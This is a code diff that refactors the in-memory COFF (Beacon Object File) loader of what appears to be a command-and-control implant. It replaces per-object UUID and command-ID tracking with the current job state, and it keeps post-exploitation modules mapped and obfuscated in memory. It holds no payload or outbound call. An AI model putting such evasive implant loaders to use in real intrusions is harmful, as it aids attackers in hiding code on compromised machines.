@@ -3,46 +3,25 @@
 auto Coff::GetCmdID(
     PVOID Address
 ) -> ULONG {
-    BOF_OBJ* Obj = Node;
-
-    while ( Obj ) {
-        if ( Address >= Obj->MmBegin && Address < Obj->MmEnd ) {
-            return Obj->CmdID; 
-        }
-        Obj = Obj->Next;
-    }
-
-    return 0; 
+    return Self->Jbs->CurrentSubId;
 }
 
 auto Coff::GetTask(
     PVOID Address
 ) -> CHAR* {
-    BOF_OBJ* Obj = Node;
-
-    while ( Obj ) {
-        if ( Address >= Obj->MmBegin && Address < Obj->MmEnd ) {
-            return Obj->UUID; 
-        }
-        Obj = Obj->Next;
-    }
-
-    return nullptr; 
+    return Self->Jbs->CurrentUUID;
 }
 
 auto Coff::Add(
     PVOID MmBegin,
     PVOID MmEnd,
-    CHAR* UUID,
-    ULONG CmdID,
     PVOID Entry
 ) -> BOF_OBJ* {
     BOF_OBJ* NewObj = (BOF_OBJ*)KhAlloc( sizeof( BOF_OBJ ) );
 
     if (
         ! MmBegin ||
-        ! MmEnd   ||
-        ! UUID
+        ! MmEnd  
     ) {
         return nullptr;
     }
@@ -50,8 +29,6 @@ auto Coff::Add(
     NewObj->Entry   = Entry;
     NewObj->MmBegin = MmBegin;
     NewObj->MmEnd   = MmEnd;
-    NewObj->UUID    = UUID;
-    NewObj->CmdID   = CmdID;
 
     if ( !this->Node ) {
         this->Node = NewObj;
@@ -557,9 +534,7 @@ auto Coff::Deobfuscate(
 auto Coff::Execute(
     _In_ COFF_MAPPED* Mapped,
     _In_ BYTE*        Args,
-    _In_ ULONG        Argc,
-    _In_ CHAR*        UUID,
-    _In_ ULONG        CmdID
+    _In_ ULONG        Argc
 ) -> BOOL {
     if ( !Mapped || !Mapped->MmBase || !Mapped->EntryPoint ) {
         KhDbg("invalid mapped COFF");
@@ -580,8 +555,7 @@ auto Coff::Execute(
     KhDbg("executing mapped COFF at 0x%p", Mapped->EntryPoint);
 
     BOF_OBJ* Obj = (BOF_OBJ*)this->Add( 
-        Mapped->MmBase, PTR( U_PTR( Mapped->MmBase ) + Mapped->MmSize ), 
-        UUID, CmdID, Mapped->EntryPoint 
+        Mapped->MmBase, PTR( U_PTR( Mapped->MmBase ) + Mapped->MmSize ), Mapped->EntryPoint 
     );
 
     if ( Obj ) KhDbg("added the object to the list");
@@ -593,7 +567,7 @@ auto Coff::Execute(
     //
     // for persistent COFFs (PostEx), re-obfuscate after execution
     //
-    if ( (Action::Task)CmdID == Action::Task::PostEx ) {
+    if ( (Action::Task)Self->Jbs->CurrentCmdId == Action::Task::PostEx ) {
         this->Obfuscate( Mapped );
     } else {
         if ( this->Rm( Obj ) ) KhDbg("removed the object from the list");
@@ -672,9 +646,7 @@ auto Coff::Loader(
     _In_ BYTE* Buffer,
     _In_ ULONG Size,
     _In_ BYTE* Args,
-    _In_ ULONG Argc,
-    _In_ CHAR* UUID,
-    _In_ ULONG CmdID
+    _In_ ULONG Argc
 ) -> BOOL {
     COFF_MAPPED Mapped = { 0 };
 
@@ -682,12 +654,12 @@ auto Coff::Loader(
         return FALSE;
     }
 
-    BOOL Result = this->Execute( &Mapped, Args, Argc, UUID, CmdID );
+    BOOL Result = this->Execute( &Mapped, Args, Argc );
 
     //
     // only unmap if not persistent (PostEx stays mapped + obfuscated)
     //
-    if ( (Action::Task)CmdID != Action::Task::PostEx ) {
+    if ( (Action::Task)Self->Jbs->CurrentCmdId != Action::Task::PostEx ) {
         this->Unmap( &Mapped );
     }
 
